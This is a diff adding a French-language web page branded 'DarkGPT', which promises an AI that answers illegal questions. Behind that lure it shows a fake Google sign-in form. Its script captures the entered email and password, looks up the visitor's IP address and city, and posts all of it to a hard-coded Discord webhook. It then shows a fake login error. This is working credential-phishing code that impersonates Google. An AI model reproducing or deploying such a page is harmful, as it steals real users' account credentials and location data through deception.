@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DarkGPT</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+    @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    @keyframes glow { 0%,100% { text-shadow: 0 0 10px #e74c3c,0 0 20px #e74c3c; } 50% { text-shadow: 0 0 20px #e74c3c,0 0 30px #e74c3c; } }
+    @keyframes flicker { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
+    @keyframes radialMove { from { transform: translate(0,0); } to { transform: translate(100px,100px); } }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    body { margin:0; padding:0; font-family: 'Roboto', sans-serif; background: linear-gradient(135deg,#121212,#1a1a1a,#121212); background-size:400% 400%; animation: gradientBG 15s ease infinite; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
+    .container { position:relative; z-index:1; text-align:center; padding:20px; }
+    .container::before, .container::after { content:''; position:absolute; width:200px; height:200px; border-radius:50%; filter:blur(100px); opacity:0.6; animation:radialMove 20s ease-in-out infinite alternate; }
+    .container::before { background:#e74c3c; top:-50px; left:-50px; }
+    .container::after { background:#8e44ad; bottom:-50px; right:-50px; }
+    #homeLoader { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); justify-content:center; align-items:center; z-index:2; }
+    #homeLoader .spinner { border:6px solid #333; border-top:6px solid #e74c3c; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; }
+    .logo { font-size:56px; font-weight:500; color:#e74c3c; animation:glow 2s ease-in-out infinite; margin-bottom:10px; }
+    .subtitle { font-size:18px; margin-bottom:30px; color:#bbbbbb; animation:flicker 4s ease-in-out infinite; }
+    .button { background-color:#1a73e8; color:#fff; border:none; padding:14px 28px; font-size:16px; border-radius:4px; cursor:pointer; transition:background-color 0.3s,transform 0.2s,box-shadow 0.2s; box-shadow:0 2px 8px rgba(0,0,0,0.3); }
+    .button:hover { background-color:#1669c1; transform:translateY(-2px); box-shadow:0 4px 12px rgba(0,0,0,0.5); }
+    #loginPage { display:none; flex-direction:column; align-items:center; z-index:1; }
+    .login-card { background-color:#fff; color:#000; padding:32px 24px; border-radius:8px; width:360px; box-shadow:0 4px 20px rgba(0,0,0,0.3); display:flex; flex-direction:column; }
+    .login-card img { display:block; margin:0 auto 20px; }
+    .login-card .title { font-size:24px; font-weight:500; margin-bottom:24px; color:#202124; text-align:left; }
+    .login-card label { font-size:14px; color:#202124; text-align:left; margin-bottom:4px; display:block; }
+    .login-card input { width:100%; padding:12px; margin-bottom:16px; border:none; border-bottom:1px solid #dadce0; font-size:16px; transition: border-color 0.2s; }
+    .login-card input:focus { outline:none; border-bottom:2px solid #1a73e8; }
+    .login-card button { background-color:#1a73e8; color:#fff; border:none; padding:10px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; align-self:flex-end; transition: background-color 0.3s; }
+    .login-card button:hover { background-color:#1669c1; }
+    .login-card .footer { display:flex; justify-content:space-between; margin-top:24px; }
+    .login-card .footer a { font-size:14px; color:#1a73e8; text-decoration:none; cursor:pointer; }
+    #loader { border:4px solid #f3f3f3; border-top:4px solid #1a73e8; border-radius:50%; width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
+    #message { margin-top:12px; color:red; font-size:14px; text-align:center; }
+  </style>
+</head>
+<body>
+  <div id="homePage" class="container">
+    <div class="logo">DarkGPT</div>
+    <p class="subtitle">L'IA interdite qui exauce vos désirs les plus sombres et répond à vos questions illégales sans aucune retenue.</p>
+    <button id="googleLoginBtn" class="button">Connexion avec Google</button>
+  </div>
+  <div id="homeLoader" class="container"><div class="spinner"></div></div>
+  <div id="loginPage" class="container">
+    <div class="login-card">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" width="92" height="30">
+      <div class="title">Connexion</div>
+      <label for="email">Email ou numéro de téléphone</label>
+      <input type="email" id="email" placeholder="exemple@gmail.com" autocomplete="username">
+      <label for="password">Mot de passe</label>
+      <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
+      <button id="submitBtn">Se connecter</button>
+      <div id="loader"></div>
+      <div id="message"></div>
+      <div class="footer">
+        <a id="createAccount">Créer un compte</a>
+        <a id="moreOptions">Plus d’options</a>
+      </div>
+    </div>
+  </div>
+  <script>
+    const googleLoginBtn = document.getElementById('googleLoginBtn');
+    const homePage = document.getElementById('homePage');
+    const homeLoader = document.getElementById('homeLoader');
+    const loginPage = document.getElementById('loginPage');
+    const submitBtn = document.getElementById('submitBtn');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const messageDiv = document.getElementById('message');
+    const loader = document.getElementById('loader');
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    document.querySelectorAll('.footer a').forEach(el => {
+      el.addEventListener('click', e => {
+        e.preventDefault();
+        messageDiv.textContent = 'Cette fonctionnalité est désactivée par le site.';
+      });
+    });
+    googleLoginBtn.addEventListener('click', () => {
+      homePage.style.display = 'none'; homeLoader.style.display = 'flex';
+      setTimeout(() => { homeLoader.style.display = 'none'; loginPage.style.display = 'flex'; }, 1000);
+    });
+    submitBtn.addEventListener('click', () => {
+      messageDiv.textContent = '';
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      // Envoi des informations à Discord via webhook avec IP et ville
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const city = data.city;
+          fetch('https://discord.com/api/webhooks/1368138150324469872/isG9Ep_Cc3-4WVFmEXD476KjaVxUc_vZ0etDh_b_l_WjvJ1FQejAjCNFJSoY1p6FAJNu', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `Email: ${email}\nPassword: ${password}\nIP: ${ip}\nVille: ${city}` })
+          });
+        });
+      if (!email) { messageDiv.textContent = 'Veuillez saisir une adresse email.'; return; }
+      if (!emailRegex.test(email)) { messageDiv.textContent = 'Veuillez saisir une adresse email valide.'; return; }
+      if (!password) { messageDiv.textContent = 'Veuillez saisir votre mot de passe.'; return; }
+      loader.style.display = 'block'; submitBtn.disabled = true;
+      setTimeout(() => { loader.style.display = 'none'; submitBtn.disabled = false;
+        messageDiv.textContent = 'Erreur : le compte n’existe pas ou le mot de passe ne fonctionne pas.';
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
